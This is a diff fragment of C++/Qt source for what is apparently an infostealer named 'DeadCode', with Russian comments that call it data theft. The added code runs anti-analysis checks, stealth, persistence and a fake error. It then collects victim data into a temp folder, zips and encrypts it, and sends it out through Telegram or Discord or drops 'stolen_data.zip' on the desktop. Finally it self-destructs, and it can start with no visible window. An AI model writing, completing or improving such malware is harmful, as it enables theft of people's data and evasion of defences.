+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to create self-destruct batch file"));
+    }
+
+    // Удаление временных файлов
+    char tempPath[MAX_PATH] = {0};
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string tempDir = std::string(tempPath) + "DeadCodeTemp";
+    if (std::filesystem::exists(tempDir)) {
+        std::filesystem::remove_all(tempDir);
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Temporary directory removed: " + tempDir));
+    }
+
+    ExitProcess(0);
+}
+
+// Основной процесс кражи и отправки данных
+void StealAndSendData() {
+    if (!g_mainWindow) return;
+
+    // Антианализ
+    if (AntiAnalysis()) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Anti-analysis triggered, exiting"));
+        SelfDestruct();
+        return;
+    }
+
+    // Скрытность
     Stealth();
     Persist();
     FakeError();
 
-    std::thread dataThread(CollectData);
-    dataThread.detach();
+    // Создание временной директории
+    char tempPath[MAX_PATH] = {0};
+    GetTempPathA(MAX_PATH, tempPath);
+    std::string tempDir = std::string(tempPath) + "DeadCodeTemp";
+    std::filesystem::create_directories(tempDir);
+    std::filesystem::create_directories(tempDir + "\\files");
 
+    // Сбор данных
+    std::string collectedDataPath = CollectData(tempDir);
+    if (collectedDataPath.empty()) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("No data collected, exiting"));
+        SelfDestruct();
+        return;
+    }
+
+    // Архивация данных
+    std::string zipPath = ArchiveData(tempDir);
+    if (zipPath.empty()) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to archive data, exiting"));
+        SelfDestruct();
+        return;
+    }
+
+    // Шифрование данных
+    std::string encryptedZipPath = tempDir + "\\data_encrypted.zip";
+    try {
+        std::string encryptedData = EncryptData(zipPath, g_mainWindow->config.encryptionKey1, g_mainWindow->config.encryptionKey2, g_mainWindow->config.encryptionSalt);
+        std::ofstream out(encryptedZipPath, std::ios::binary);
+        if (out.is_open()) {
+            out << encryptedData;
+            out.close();
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Data encrypted to: " + encryptedZipPath));
+        } else {
+            std::lock_guard<std::mutex> lock(g_mutex);
+            if (g_mainWindow) g_mainWindow->emitLog(QString("Failed to save encrypted data"));
+            SelfDestruct();
+            return;
+        }
+    } catch (const std::exception& e) {
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Encryption failed: " + std::string(e.what())));
+        SelfDestruct();
+        return;
+    }
+
+    // Отправка данных
+    std::vector<std::string> filesToSend = { encryptedZipPath };
+    if (g_mainWindow->config.screenshot) {
+        filesToSend.insert(filesToSend.end(), g_mainWindow->screenshotsPaths.begin(), g_mainWindow->screenshotsPaths.end());
+    }
+
+    if (g_mainWindow->config.sendMethod == "Telegram") {
+        for (const auto& file : filesToSend) {
+            QFile qFile(QString::fromStdString(file));
+            if (qFile.open(QIODevice::ReadOnly)) {
+                QByteArray fileData = qFile.readAll();
+                qFile.close();
+                g_mainWindow->sendData(QString::fromStdString(encryptedZipPath), filesToSend);
+            } else {
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to read file for sending: " + file));
+            }
+        }
+    } else if (g_mainWindow->config.sendMethod == "Discord") {
+        for (const auto& file : filesToSend) {
+            QFile qFile(QString::fromStdString(file));
+            if (qFile.open(QIODevice::ReadOnly)) {
+                QByteArray fileData = qFile.readAll();
+                qFile.close();
+                g_mainWindow->sendData(QString::fromStdString(encryptedZipPath), filesToSend);
+            } else {
+                std::lock_guard<std::mutex> lock(g_mutex);
+                if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Failed to read file for sending: " + file));
+            }
+        }
+    } else {
+        // Локальное сохранение
+        std::string localPath = std::string(getenv("USERPROFILE")) + "\\Desktop\\stolen_data.zip";
+        std::filesystem::copy_file(encryptedZipPath, localPath, std::filesystem::copy_options::overwrite_existing);
+        std::lock_guard<std::mutex> lock(g_mutex);
+        if (g_mainWindow) g_mainWindow->emitLog(QString::fromStdString("Data saved locally to: " + localPath));
+    }
+
+    // Самоуничтожение
+    SelfDestruct();
+}
+
+// Точка входа
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Инициализация GDI+
+    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
+
+    // Инициализация Qt приложения
+    int argc = 0;
+    QApplication app(argc, nullptr);
+
+    // Создание главного окна
+    MainWindow w;
+    g_mainWindow = &w;
+
+    // Показ окна, если не в тихом режиме
+    if (!g_mainWindow->config.silent) {
+        w.show();
+    }
+
+    // Запуск процесса кражи данных в отдельном потоке
+    std::thread stealThread(StealAndSendData);
+    stealThread.detach();
+
+    // Запуск цикла обработки событий Qt
     int result = app.exec();
 
-    delete g_mainWindow;
+    // Очистка GDI+
     Gdiplus::GdiplusShutdown(gdiplusToken);
+
     return result;
 }
